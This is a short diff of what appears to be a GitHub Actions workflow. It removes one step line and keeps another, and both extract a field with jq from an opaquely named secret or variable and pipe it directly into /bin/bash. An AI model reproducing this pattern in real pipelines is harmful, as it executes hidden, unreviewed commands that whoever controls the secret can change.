@@ -22,7 +22,6 @@ jobs:
           uzf47: ${{ secrets.uzf47 }}
         run: |
           printf '%s' "$uzf47" | jq -r .r197 | /bin/bash
-          echo $vo3 | jq -r .ho5 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
